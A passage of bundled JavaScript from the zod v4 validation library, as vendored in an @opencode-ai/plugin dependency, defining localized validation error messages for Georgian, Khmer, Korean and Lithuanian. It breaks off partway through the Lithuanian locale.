// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ka.js
var parsedType5 = (data) => {
  const t = typeof data;
  switch (t) {
    case "number": {
      return Number.isNaN(data) ? "NaN" : "\u10E0\u10D8\u10EA\u10EE\u10D5\u10D8";
    }
    case "object": {
      if (Array.isArray(data)) {
        return "\u10DB\u10D0\u10E1\u10D8\u10D5\u10D8";
      }
      if (data === null) {
        return "null";
      }
      if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
        return data.constructor.name;
      }
    }
  }
  const typeMap = {
    string: "\u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8",
    boolean: "\u10D1\u10E3\u10DA\u10D4\u10D0\u10DC\u10D8",
    undefined: "undefined",
    bigint: "bigint",
    symbol: "symbol",
    function: "\u10E4\u10E3\u10DC\u10E5\u10EA\u10D8\u10D0"
  };
  return typeMap[t] ?? t;
};
var error68 = () => {
  const Sizable = {
    string: { unit: "\u10E1\u10D8\u10DB\u10D1\u10DD\u10DA\u10DD", verb: "\u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D8\u10EA\u10D0\u10D5\u10D3\u10D4\u10E1" },
    file: { unit: "\u10D1\u10D0\u10D8\u10E2\u10D8", verb: "\u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D8\u10EA\u10D0\u10D5\u10D3\u10D4\u10E1" },
    array: { unit: "\u10D4\u10DA\u10D4\u10DB\u10D4\u10DC\u10E2\u10D8", verb: "\u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D8\u10EA\u10D0\u10D5\u10D3\u10D4\u10E1" },
    set: { unit: "\u10D4\u10DA\u10D4\u10DB\u10D4\u10DC\u10E2\u10D8", verb: "\u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D8\u10EA\u10D0\u10D5\u10D3\u10D4\u10E1" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const Nouns = {
    regex: "\u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0",
    email: "\u10D4\u10DA-\u10E4\u10DD\u10E1\u10E2\u10D8\u10E1 \u10DB\u10D8\u10E1\u10D0\u10DB\u10D0\u10E0\u10D7\u10D8",
    url: "URL",
    emoji: "\u10D4\u10DB\u10DD\u10EF\u10D8",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u10D7\u10D0\u10E0\u10D8\u10E6\u10D8-\u10D3\u10E0\u10DD",
    date: "\u10D7\u10D0\u10E0\u10D8\u10E6\u10D8",
    time: "\u10D3\u10E0\u10DD",
    duration: "\u10EE\u10D0\u10DC\u10D2\u10E0\u10EB\u10DA\u10D8\u10D5\u10DD\u10D1\u10D0",
    ipv4: "IPv4 \u10DB\u10D8\u10E1\u10D0\u10DB\u10D0\u10E0\u10D7\u10D8",
    ipv6: "IPv6 \u10DB\u10D8\u10E1\u10D0\u10DB\u10D0\u10E0\u10D7\u10D8",
    cidrv4: "IPv4 \u10D3\u10D8\u10D0\u10DE\u10D0\u10D6\u10DD\u10DC\u10D8",
    cidrv6: "IPv6 \u10D3\u10D8\u10D0\u10DE\u10D0\u10D6\u10DD\u10DC\u10D8",
    base64: "base64-\u10D9\u10DD\u10D3\u10D8\u10E0\u10D4\u10D1\u10E3\u10DA\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8",
    base64url: "base64url-\u10D9\u10DD\u10D3\u10D8\u10E0\u10D4\u10D1\u10E3\u10DA\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8",
    json_string: "JSON \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8",
    e164: "E.164 \u10DC\u10DD\u10DB\u10D4\u10E0\u10D8",
    jwt: "JWT",
    template_literal: "\u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${issue3.expected}, \u10DB\u10D8\u10E6\u10D4\u10D1\u10E3\u10DA\u10D8 ${parsedType5(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10D5\u10D0\u10E0\u10D8\u10D0\u10DC\u10E2\u10D8: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8\u10D0 \u10D4\u10E0\u10D7-\u10D4\u10E0\u10D7\u10D8 ${joinValues2(issue3.values, "|")}-\u10D3\u10D0\u10DC`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u10D6\u10D4\u10D3\u10DB\u10D4\u10E2\u10D0\u10D3 \u10D3\u10D8\u10D3\u10D8: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${issue3.origin ?? "\u10DB\u10DC\u10D8\u10E8\u10D5\u10DC\u10D4\u10DA\u10DD\u10D1\u10D0"} ${sizing.verb} ${adj}${issue3.maximum.toString()} ${sizing.unit}`;
        return `\u10D6\u10D4\u10D3\u10DB\u10D4\u10E2\u10D0\u10D3 \u10D3\u10D8\u10D3\u10D8: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${issue3.origin ?? "\u10DB\u10DC\u10D8\u10E8\u10D5\u10DC\u10D4\u10DA\u10DD\u10D1\u10D0"} \u10D8\u10E7\u10DD\u10E1 ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u10D6\u10D4\u10D3\u10DB\u10D4\u10E2\u10D0\u10D3 \u10DE\u10D0\u10E2\u10D0\u10E0\u10D0: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${issue3.origin} ${sizing.verb} ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `\u10D6\u10D4\u10D3\u10DB\u10D4\u10E2\u10D0\u10D3 \u10DE\u10D0\u10E2\u10D0\u10E0\u10D0: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${issue3.origin} \u10D8\u10E7\u10DD\u10E1 ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8: \u10E3\u10DC\u10D3\u10D0 \u10D8\u10EC\u10E7\u10D4\u10D1\u10DD\u10D3\u10D4\u10E1 "${_issue.prefix}"-\u10D8\u10D7`;
        }
        if (_issue.format === "ends_with")
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8: \u10E3\u10DC\u10D3\u10D0 \u10DB\u10D7\u10D0\u10D5\u10E0\u10D3\u10D4\u10D1\u10DD\u10D3\u10D4\u10E1 "${_issue.suffix}"-\u10D8\u10D7`;
        if (_issue.format === "includes")
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8: \u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D8\u10EA\u10D0\u10D5\u10D3\u10D4\u10E1 "${_issue.includes}"-\u10E1`;
        if (_issue.format === "regex")
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8: \u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D4\u10E1\u10D0\u10D1\u10D0\u10DB\u10D4\u10D1\u10DD\u10D3\u10D4\u10E1 \u10E8\u10D0\u10D1\u10DA\u10DD\u10DC\u10E1 ${_issue.pattern}`;
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E0\u10D8\u10EA\u10EE\u10D5\u10D8: \u10E3\u10DC\u10D3\u10D0 \u10D8\u10E7\u10DD\u10E1 ${issue3.divisor}-\u10D8\u10E1 \u10EF\u10D4\u10E0\u10D0\u10D3\u10D8`;
      case "unrecognized_keys":
        return `\u10E3\u10EA\u10DC\u10DD\u10D1\u10D8 \u10D2\u10D0\u10E1\u10D0\u10E6\u10D4\u10D1${issue3.keys.length > 1 ? "\u10D4\u10D1\u10D8" : "\u10D8"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10D2\u10D0\u10E1\u10D0\u10E6\u10D4\u10D1\u10D8 ${issue3.origin}-\u10E8\u10D8`;
      case "invalid_union":
        return "\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0";
      case "invalid_element":
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10DB\u10DC\u10D8\u10E8\u10D5\u10DC\u10D4\u10DA\u10DD\u10D1\u10D0 ${issue3.origin}-\u10E8\u10D8`;
      default:
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0`;
    }
  };
};
function ka_default2() {
  return {
    localeError: error68()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/km.js
var error69 = () => {
  const Sizable = {
    string: { unit: "\u178F\u17BD\u17A2\u1780\u17D2\u179F\u179A", verb: "\u1782\u17BD\u179A\u1798\u17B6\u1793" },
    file: { unit: "\u1794\u17C3", verb: "\u1782\u17BD\u179A\u1798\u17B6\u1793" },
    array: { unit: "\u1792\u17B6\u178F\u17BB", verb: "\u1782\u17BD\u179A\u1798\u17B6\u1793" },
    set: { unit: "\u1792\u17B6\u178F\u17BB", verb: "\u1782\u17BD\u179A\u1798\u17B6\u1793" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType6 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "\u1798\u17B7\u1793\u1798\u17C2\u1793\u1787\u17B6\u179B\u17C1\u1781 (NaN)" : "\u179B\u17C1\u1781";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u17A2\u17B6\u179A\u17C1 (Array)";
        }
        if (data === null) {
          return "\u1782\u17D2\u1798\u17B6\u1793\u178F\u1798\u17D2\u179B\u17C3 (null)";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1794\u1789\u17D2\u1785\u17BC\u179B",
    email: "\u17A2\u17B6\u179F\u1799\u178A\u17D2\u178B\u17B6\u1793\u17A2\u17CA\u17B8\u1798\u17C2\u179B",
    url: "URL",
    emoji: "\u179F\u1789\u17D2\u1789\u17B6\u17A2\u17B6\u179A\u1798\u17D2\u1798\u178E\u17CD",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u1780\u17B6\u179B\u1794\u179A\u17B7\u1785\u17D2\u1786\u17C1\u1791 \u1793\u17B7\u1784\u1798\u17C9\u17C4\u1784 ISO",
    date: "\u1780\u17B6\u179B\u1794\u179A\u17B7\u1785\u17D2\u1786\u17C1\u1791 ISO",
    time: "\u1798\u17C9\u17C4\u1784 ISO",
    duration: "\u179A\u1799\u17C8\u1796\u17C1\u179B ISO",
    ipv4: "\u17A2\u17B6\u179F\u1799\u178A\u17D2\u178B\u17B6\u1793 IPv4",
    ipv6: "\u17A2\u17B6\u179F\u1799\u178A\u17D2\u178B\u17B6\u1793 IPv6",
    cidrv4: "\u178A\u17C2\u1793\u17A2\u17B6\u179F\u1799\u178A\u17D2\u178B\u17B6\u1793 IPv4",
    cidrv6: "\u178A\u17C2\u1793\u17A2\u17B6\u179F\u1799\u178A\u17D2\u178B\u17B6\u1793 IPv6",
    base64: "\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u17A2\u17CA\u17B7\u1780\u17BC\u178A base64",
    base64url: "\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u17A2\u17CA\u17B7\u1780\u17BC\u178A base64url",
    json_string: "\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A JSON",
    e164: "\u179B\u17C1\u1781 E.164",
    jwt: "JWT",
    template_literal: "\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1794\u1789\u17D2\u1785\u17BC\u179B"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1794\u1789\u17D2\u1785\u17BC\u179B\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${issue3.expected} \u1794\u17C9\u17BB\u1793\u17D2\u178F\u17C2\u1791\u1791\u17BD\u179B\u1794\u17B6\u1793 ${parsedType6(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1794\u1789\u17D2\u1785\u17BC\u179B\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u1787\u1798\u17D2\u179A\u17BE\u179F\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1787\u17B6\u1798\u17BD\u1799\u1780\u17D2\u1793\u17BB\u1784\u1785\u17C6\u178E\u17C4\u1798 ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u1792\u17C6\u1796\u17C1\u1780\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${issue3.origin ?? "\u178F\u1798\u17D2\u179B\u17C3"} ${adj} ${issue3.maximum.toString()} ${sizing.unit ?? "\u1792\u17B6\u178F\u17BB"}`;
        return `\u1792\u17C6\u1796\u17C1\u1780\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${issue3.origin ?? "\u178F\u1798\u17D2\u179B\u17C3"} ${adj} ${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u178F\u17BC\u1785\u1796\u17C1\u1780\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${issue3.origin} ${adj} ${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `\u178F\u17BC\u1785\u1796\u17C1\u1780\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${issue3.origin} ${adj} ${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1785\u17B6\u1794\u17CB\u1795\u17D2\u178F\u17BE\u1798\u178A\u17C4\u1799 "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1794\u1789\u17D2\u1785\u1794\u17CB\u178A\u17C4\u1799 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1798\u17B6\u1793 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u178F\u17C2\u1795\u17D2\u1782\u17BC\u1795\u17D2\u1782\u1784\u1793\u17B9\u1784\u1791\u1798\u17D2\u179A\u1784\u17CB\u178A\u17C2\u179B\u1794\u17B6\u1793\u1780\u17C6\u178E\u178F\u17CB ${_issue.pattern}`;
        return `\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u179B\u17C1\u1781\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u178F\u17C2\u1787\u17B6\u1796\u17A0\u17BB\u1782\u17BB\u178E\u1793\u17C3 ${issue3.divisor}`;
      case "unrecognized_keys":
        return `\u179A\u1780\u1783\u17BE\u1789\u179F\u17C4\u1798\u17B7\u1793\u179F\u17D2\u1782\u17B6\u179B\u17CB\u17D6 ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\u179F\u17C4\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u1793\u17C5\u1780\u17D2\u1793\u17BB\u1784 ${issue3.origin}`;
      case "invalid_union":
        return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C`;
      case "invalid_element":
        return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u1793\u17C5\u1780\u17D2\u1793\u17BB\u1784 ${issue3.origin}`;
      default:
        return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C`;
    }
  };
};
function km_default2() {
  return {
    localeError: error69()
  };
}

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/kh.js
function kh_default2() {
  return km_default2();
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ko.js
var error70 = () => {
  const Sizable = {
    string: { unit: "\uBB38\uC790", verb: "to have" },
    file: { unit: "\uBC14\uC774\uD2B8", verb: "to have" },
    array: { unit: "\uAC1C", verb: "to have" },
    set: { unit: "\uAC1C", verb: "to have" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType6 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "number";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\uC785\uB825",
    email: "\uC774\uBA54\uC77C \uC8FC\uC18C",
    url: "URL",
    emoji: "\uC774\uBAA8\uC9C0",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \uB0A0\uC9DC\uC2DC\uAC04",
    date: "ISO \uB0A0\uC9DC",
    time: "ISO \uC2DC\uAC04",
    duration: "ISO \uAE30\uAC04",
    ipv4: "IPv4 \uC8FC\uC18C",
    ipv6: "IPv6 \uC8FC\uC18C",
    cidrv4: "IPv4 \uBC94\uC704",
    cidrv6: "IPv6 \uBC94\uC704",
    base64: "base64 \uC778\uCF54\uB529 \uBB38\uC790\uC5F4",
    base64url: "base64url \uC778\uCF54\uB529 \uBB38\uC790\uC5F4",
    json_string: "JSON \uBB38\uC790\uC5F4",
    e164: "E.164 \uBC88\uD638",
    jwt: "JWT",
    template_literal: "\uC785\uB825"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\uC798\uBABB\uB41C \uC785\uB825: \uC608\uC0C1 \uD0C0\uC785\uC740 ${issue3.expected}, \uBC1B\uC740 \uD0C0\uC785\uC740 ${parsedType6(issue3.input)}\uC785\uB2C8\uB2E4`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\uC798\uBABB\uB41C \uC785\uB825: \uAC12\uC740 ${stringifyPrimitive2(issue3.values[0])} \uC774\uC5B4\uC57C \uD569\uB2C8\uB2E4`;
        return `\uC798\uBABB\uB41C \uC635\uC158: ${joinValues2(issue3.values, "\uB610\uB294 ")} \uC911 \uD558\uB098\uC5EC\uC57C \uD569\uB2C8\uB2E4`;
      case "too_big": {
        const adj = issue3.inclusive ? "\uC774\uD558" : "\uBBF8\uB9CC";
        const suffix = adj === "\uBBF8\uB9CC" ? "\uC774\uC5B4\uC57C \uD569\uB2C8\uB2E4" : "\uC5EC\uC57C \uD569\uB2C8\uB2E4";
        const sizing = getSizing(issue3.origin);
        const unit = sizing?.unit ?? "\uC694\uC18C";
        if (sizing)
          return `${issue3.origin ?? "\uAC12"}\uC774 \uB108\uBB34 \uD07D\uB2C8\uB2E4: ${issue3.maximum.toString()}${unit} ${adj}${suffix}`;
        return `${issue3.origin ?? "\uAC12"}\uC774 \uB108\uBB34 \uD07D\uB2C8\uB2E4: ${issue3.maximum.toString()} ${adj}${suffix}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? "\uC774\uC0C1" : "\uCD08\uACFC";
        const suffix = adj === "\uC774\uC0C1" ? "\uC774\uC5B4\uC57C \uD569\uB2C8\uB2E4" : "\uC5EC\uC57C \uD569\uB2C8\uB2E4";
        const sizing = getSizing(issue3.origin);
        const unit = sizing?.unit ?? "\uC694\uC18C";
        if (sizing) {
          return `${issue3.origin ?? "\uAC12"}\uC774 \uB108\uBB34 \uC791\uC2B5\uB2C8\uB2E4: ${issue3.minimum.toString()}${unit} ${adj}${suffix}`;
        }
        return `${issue3.origin ?? "\uAC12"}\uC774 \uB108\uBB34 \uC791\uC2B5\uB2C8\uB2E4: ${issue3.minimum.toString()} ${adj}${suffix}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `\uC798\uBABB\uB41C \uBB38\uC790\uC5F4: "${_issue.prefix}"(\uC73C)\uB85C \uC2DC\uC791\uD574\uC57C \uD569\uB2C8\uB2E4`;
        }
        if (_issue.format === "ends_with")
          return `\uC798\uBABB\uB41C \uBB38\uC790\uC5F4: "${_issue.suffix}"(\uC73C)\uB85C \uB05D\uB098\uC57C \uD569\uB2C8\uB2E4`;
        if (_issue.format === "includes")
          return `\uC798\uBABB\uB41C \uBB38\uC790\uC5F4: "${_issue.includes}"\uC744(\uB97C) \uD3EC\uD568\uD574\uC57C \uD569\uB2C8\uB2E4`;
        if (_issue.format === "regex")
          return `\uC798\uBABB\uB41C \uBB38\uC790\uC5F4: \uC815\uADDC\uC2DD ${_issue.pattern} \uD328\uD134\uACFC \uC77C\uCE58\uD574\uC57C \uD569\uB2C8\uB2E4`;
        return `\uC798\uBABB\uB41C ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\uC798\uBABB\uB41C \uC22B\uC790: ${issue3.divisor}\uC758 \uBC30\uC218\uC5EC\uC57C \uD569\uB2C8\uB2E4`;
      case "unrecognized_keys":
        return `\uC778\uC2DD\uD560 \uC218 \uC5C6\uB294 \uD0A4: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\uC798\uBABB\uB41C \uD0A4: ${issue3.origin}`;
      case "invalid_union":
        return `\uC798\uBABB\uB41C \uC785\uB825`;
      case "invalid_element":
        return `\uC798\uBABB\uB41C \uAC12: ${issue3.origin}`;
      default:
        return `\uC798\uBABB\uB41C \uC785\uB825`;
    }
  };
};
function ko_default2() {
  return {
    localeError: error70()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/lt.js
var parsedType6 = (data) => {
  const t = typeof data;
  return parsedTypeFromType(t, data);
};
var parsedTypeFromType = (t, data = undefined) => {
  switch (t) {
    case "number": {
      return Number.isNaN(data) ? "NaN" : "skai\u010Dius";
    }
    case "bigint": {
      return "sveikasis skai\u010Dius";
    }
    case "string": {
      return "eilut\u0117";
    }
    case "boolean": {
      return "login\u0117 reik\u0161m\u0117";
    }
    case "undefined":
    case "void": {
      return "neapibr\u0117\u017Eta reik\u0161m\u0117";
    }
    case "function": {
      return "funkcija";
    }
    case "symbol": {
      return "simbolis";
    }
    case "object": {
      if (data === undefined)
        return "ne\u017Einomas objektas";
      if (data === null)
        return "nulin\u0117 reik\u0161m\u0117";
      if (Array.isArray(data))
        return "masyvas";
      if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
        return data.constructor.name;
      }
      return "objektas";
    }
    case "null": {
      return "nulin\u0117 reik\u0161m\u0117";
    }
  }
  return t;
};
var capitalizeFirstCharacter2 = (text) => {
  return text.charAt(0).toUpperCase() + text.slice(1);
};
function getUnitTypeFromNumber2(number5) {
  const abs = Math.abs(number5);
  const last = abs % 10;
  const last2 = abs % 100;
  if (last2 >= 11 && last2 <= 19 || last === 0)
    return "many";
  if (last === 1)
    return "one";
  return "few";
}
var error71 = () => {
  const Sizable = {
    string: {
      unit: {
        one: "simbolis",
        few: "simboliai",
        many: "simboli\u0173"
      },
      verb: {
        smaller: {
          inclusive: "turi b\u016Bti ne ilgesn\u0117 kaip",
          notInclusive: "turi b\u016Bti trumpesn\u0117 kaip"
        },
        bigger: {
          inclusive: "turi b\u016Bti ne trumpesn\u0117 kaip",
          notInclusive: "turi b\u016Bti ilgesn\u0117 kaip"
        }
      }
    },
    file: {
      unit: {
        one: "baitas",
        few: "baitai",
        many: "bait\u0173"
      },
      verb: {
        smaller: {
          inclusive: "turi b\u016Bti ne didesnis kaip",
          notInclusive: "turi b\u016Bti ma\u017Eesnis kaip"
        },
        bigger: {
          inclusive: "turi b\u016Bti ne ma\u017Eesnis kaip",
          notInclusive: "turi b\u016Bti didesnis kaip"
        }
      }
    },
    array: {
      unit: {
        one: "element\u0105",
        few: "elementus",
        many: "element\u0173"
      },
      verb: {
        smaller: {
          inclusive: "turi tur\u0117ti ne daugiau kaip",
          notInclusive: "turi tur\u0117ti ma\u017Eiau kaip"
        },
        bigger: {
          inclusive: "turi tur\u0117ti ne ma\u017Eiau kaip",
          notInclusive: "turi tur\u0117ti daugiau kaip"
        }
      }
    },
    set: {
      unit: {
        one: "element\u0105",
        few: "elementus",
        many: "element\u0173"
      },
      verb: {
        smaller: {
          inclusive: "turi tur\u0117ti ne daugiau kaip",
          notInclusive: "turi tur\u0117ti ma\u017Eiau kaip"
        },
        bigger: {
          inclusive: "turi tur\u0117ti ne ma\u017Eiau kaip",
          notInclusive: "turi tur\u0117ti daugiau kaip"
        }
      }
    }
  };
  function getSizing(origin, unitType, inclusive, targetShouldBe) {
    const result = Sizable[origin] ?? null;
    if (result === null)
      return result;
    return {
      unit: result.unit[unitType],
      verb: result.verb[targetShouldBe][inclusive ? "inclusive" : "notInclusive"]
    };
  }
  const Nouns = {
    regex: "\u012Fvestis",
    email: "el. pa\u0161to adresas",
    url: "URL",
    emoji: "jaustukas",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
